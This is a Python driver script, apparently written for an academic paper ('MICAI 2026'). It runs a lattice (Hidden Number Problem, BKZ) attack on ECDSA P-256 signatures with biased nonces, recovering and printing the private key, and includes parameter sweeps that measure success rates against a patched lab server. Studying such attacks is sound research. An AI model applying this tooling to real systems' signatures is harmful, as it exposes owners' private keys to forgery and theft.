#!/usr/bin/env python3
"""
lattice_attack.py
=================
Orquestador del ataque reticular completo sobre firmas ECDSA con nonce sesgado.

Uso:

    # Ataque básico:
    python3 attack/lattice_attack.py \
        --sigs data/signatures_b8.json \
        --bits 8 --nsigs 40 --bkz 20

    # Con verificación contra la clave real:
    python3 attack/lattice_attack.py \
        --sigs data/signatures_b8.json \
        --bits 8 --nsigs 40 --bkz 20 \
        --key  server/server_key.pem

    # Barrido de parámetros (para el paper):
    python3 attack/lattice_attack.py \
        --sigs data/signatures_b8.json \
        --sweep --bits 8 --bkz 20
"""

import argparse
import json
import os
import random
import sys
import time
from pathlib import Path

# Añadir el directorio padre al path
sys.path.insert(0, str(Path(__file__).parent))

from hnp_lattice import (
    compute_hnp_coefficients,
    build_hnp_lattice,
    reduce_lattice,
    extract_d_candidates,
    verify_candidate,
    verify_with_public_key,
    hnp_attack_pipeline,
    P256_N,
    P256_BITS,
)

# ── Constante ────────────────────────────────────────────────────────────────
BOLD  = "\033[1m"
RED   = "\033[91m"
GREEN = "\033[92m"
CYAN  = "\033[96m"
RESET = "\033[0m"


# ════════════════════════════════════════════════════════════════════════════
# Carga y validación de firmas
# ════════════════════════════════════════════════════════════════════════════

def load_signatures(path: str, n: int = P256_N) -> list[dict]:
    """Carga firmas desde un archivo JSON. Valida r, s, h."""
    with open(path, "r") as f:
        raw = json.load(f)

    sigs = []
    for i, obj in enumerate(raw):
        try:
            r = int(obj["r"]) if isinstance(obj["r"], int) else int(obj["r"], 16)
            s = int(obj["s"]) if isinstance(obj["s"], int) else int(obj["s"], 16)
            h = int(obj["h"]) if isinstance(obj["h"], int) else int(obj["h"], 16)
        except (KeyError, ValueError, TypeError) as e:
            print(f"  AVISO: firma {i} inválida ({e}), saltando.")
            continue

        if not (1 <= r < n and 1 <= s < n):
            print(f"  AVISO: firma {i}: r o s fuera de rango, saltando.")
            continue
        if h == 0:
            print(f"  AVISO: firma {i}: h=0, saltando.")
            continue

        sigs.append({"r": r, "s": s, "h": h})

    return sigs


def load_private_key(key_pem: str) -> int | None:
    """Carga la clave privada del servidor desde un archivo PEM."""
    try:
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        with open(key_pem, "rb") as f:
            key = load_pem_private_key(f.read(), password=None)
        return key.private_numbers().private_value
    except Exception as e:
        print(f"  AVISO: no se pudo cargar la clave PEM ({e})")
        return None


# ════════════════════════════════════════════════════════════════════════════
# Ataque único
# ════════════════════════════════════════════════════════════════════════════

def run_single_attack(sigs: list[dict],
                      b: int,
                      t: int,
                      bkz_block: int,
                      d_real: int | None = None,
                      key_pem: str | None = None,
                      verbose: bool = True,
                      n: int = P256_N) -> dict:
    """
    Ejecuta un ataque reticular con los parámetros dados.

    Retorna un dict con:
        success   : bool
        d_found   : int o None
        time_s    : tiempo en segundos
        t, b, bkz : parámetros usados
    """
    # Seleccionar t firmas aleatoriamente del dataset
    subset = random.sample(sigs, min(t, len(sigs)))

    start = time.perf_counter()
    d_found = hnp_attack_pipeline(
        sigs=subset,
        b=b,
        bkz_block=bkz_block,
        n=n,
        verbose=verbose,
    )
    elapsed = time.perf_counter() - start

    # Verificación fuerte con la clave real (si se proporcionó)
    success = False
    if d_found is not None:
        if d_real is not None:
            success = (d_found == d_real)
        elif key_pem is not None:
            success = verify_with_public_key(d_found, pub_key_pem=key_pem)
        else:
            # Verificación heurística: los nonces deben ser pequeños
            success = verify_candidate(d_found, subset, n)

    return {
        "success":  success,
        "d_found":  d_found,
        "time_s":   elapsed,
        "t":        t,
        "b":        b,
        "bkz":      bkz_block,
    }


# ════════════════════════════════════════════════════════════════════════════
# Barrido de parámetros (para el paper)
# ════════════════════════════════════════════════════════════════════════════

def run_sweep(sigs: list[dict],
              b: int,
              bkz_block: int,
              t_values: list[int],
              reps: int = 5,
              d_real: int | None = None,
              n: int = P256_N) -> list[dict]:
    """
    Barre diferentes valores de t (número de firmas) y registra la tasa de éxito.
    Útil para generar la curva t*(b) del paper.

    Retorna lista de resultados por (t, rep).
    """
    results = []
    total = len(t_values) * reps
    done = 0

    for t in t_values:
        if t > len(sigs):
            print(f"  SKIP t={t}: no hay suficientes firmas (disponibles: {len(sigs)})")
            continue

        successes = 0
        for rep in range(reps):
            res = run_single_attack(sigs, b, t, bkz_block,
                                    d_real=d_real, verbose=False, n=n)
            if res["success"]:
                successes += 1
            done += 1
            print(f"  [{done}/{total}] t={t}, rep={rep+1}/{reps}: "
                  f"{'OK' if res['success'] else '--'} "
                  f"({res['time_s']:.1f}s)", end="\r")
            results.append(res)

        rate = successes / reps
        print(f"\n  t={t:3d}: tasa de éxito = {rate:.2f} "
              f"({successes}/{reps} OK)                    ")

    return results


# ════════════════════════════════════════════════════════════════════════════
# Interfaz de línea de comandos
# ════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Ataque reticular HNP sobre firmas ECDSA con nonce sesgado.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--sigs",  required=True,
                        help="JSON con firmas ECDSA extraídas")
    parser.add_argument("--bits",  type=int, default=8,
                        help="Bits filtrados b (MSBs del nonce = 0)")
    parser.add_argument("--nsigs", type=int, default=40,
                        help="Número de firmas a usar en el ataque")
    parser.add_argument("--bkz",   type=int, default=20,
                        help="Blocksize del algoritmo BKZ")
    parser.add_argument("--key",   type=str, default=None,
                        help="Clave privada PEM del servidor (para verificación)")
    parser.add_argument("--sweep", action="store_true",
                        help="Barrer t ∈ {20,30,40,50,80} y reportar tasas de éxito")
    parser.add_argument("--reps",  type=int, default=5,
                        help="Repeticiones por valor de t en el barrido")
    parser.add_argument("--seed",  type=int, default=42,
                        help="Semilla aleatoria para reproducibilidad")
    parser.add_argument("--out",   type=str, default=None,
                        help="Guardar resultados en JSON (opcional)")
    args = parser.parse_args()

    random.seed(args.seed)

    print(f"\n{BOLD}{'='*54}{RESET}")
    print(f"{BOLD} ECDSA Lattice Attack — MICAI 2026{RESET}")
    print(f"{BOLD}{'='*54}{RESET}")
    print(f"  Firmas:     {args.sigs}")
    print(f"  b (bits):   {args.bits}")
    print(f"  t (sigs):   {args.nsigs}")
    print(f"  BKZ block:  {args.bkz}")
    print()

    # ── Cargar firmas ──
    print(f"[1] Cargando firmas...")
    sigs = load_signatures(args.sigs)
    print(f"    {len(sigs)} firmas válidas cargadas.")

    if len(sigs) < args.nsigs:
        print(f"{RED}    AVISO: {len(sigs)} < {args.nsigs} firmas requeridas.{RESET}")
        print(f"    Continúa con {len(sigs)} firmas.")
        args.nsigs = len(sigs)

    # ── Cargar clave real (opcional) ──
    d_real = None
    if args.key:
        print(f"[2] Cargando clave privada del servidor...")
        d_real = load_private_key(args.key)
        if d_real:
            print(f"    Clave cargada: {hex(d_real)[:22]}...")
        else:
            print(f"    No se pudo cargar la clave.")

    # ── Modo barrido ──
    if args.sweep:
        print(f"\n[3] MODO BARRIDO: b={args.bits}, BKZ-{args.bkz}")
        t_values = [t for t in [20, 30, 40, 50, 80, 100]
                    if t <= len(sigs)]
        print(f"    Valores de t a probar: {t_values}")
        print(f"    Repeticiones por t: {args.reps}")
        print()

        results = run_sweep(
            sigs=sigs,
            b=args.bits,
            bkz_block=args.bkz,
            t_values=t_values,
            reps=args.reps,
            d_real=d_real,
        )

        # Resumen
        print(f"\n{'─'*40}")
        print(f"{'t':>6} | {'tasa':>6} | {'tiempo':>8}")
        print(f"{'─'*40}")
        for t in t_values:
            t_results = [r for r in results if r["t"] == t]
            if not t_results:
                continue
            rate = sum(r["success"] for r in t_results) / len(t_results)
            avg_t = sum(r["time_s"] for r in t_results) / len(t_results)
            bar = "█" * int(rate * 10) + "░" * (10 - int(rate * 10))
            col = GREEN if rate >= 0.8 else (CYAN if rate >= 0.4 else RED)
            print(f"{t:>6} | {col}{rate:>5.1%}{RESET} | {avg_t:>7.1f}s  {bar}")

        if args.out:
            os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
            with open(args.out, "w") as f:
                json.dump(results, f, default=str, indent=2)
            print(f"\n  Resultados guardados en {args.out}")

        return

    # ── Ataque único ──
    print(f"\n[3] Ejecutando ataque reticular...")
    result = run_single_attack(
        sigs=sigs,
        b=args.bits,
        t=args.nsigs,
        bkz_block=args.bkz,
        d_real=d_real,
        key_pem=args.key,
        verbose=True,
    )

    # ── Resultado ──
    print(f"\n{'═'*54}")
    if result["success"]:
        print(f"{GREEN}{BOLD}  ✓ ATAQUE EXITOSO{RESET}")
        print(f"  Clave privada recuperada:")
        print(f"  d = {hex(result['d_found'])}")
        if d_real:
            match = result["d_found"] == d_real
            color = GREEN if match else RED
            print(f"  Verificación vs clave real: {color}{'COINCIDE' if match else 'NO COINCIDE'}{RESET}")
    else:
        print(f"{RED}{BOLD}  ✗ ATAQUE FALLIDO{RESET}")
        print(f"  Sugerencias:")
        print(f"    - Incrementar --nsigs (actual: {args.nsigs})")
        print(f"    - Incrementar --bkz (actual: {args.bkz})")
        print(f"    - Verificar que --bits coincide con el parche del servidor")

    print(f"  Tiempo: {result['time_s']:.2f} segundos")
    print(f"{'═'*54}\n")

    if args.out:
        os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
        with open(args.out, "w") as f:
            json.dump(result, f, default=str, indent=2)
        print(f"  Resultado guardado en {args.out}")


if __name__ == "__main__":
    main()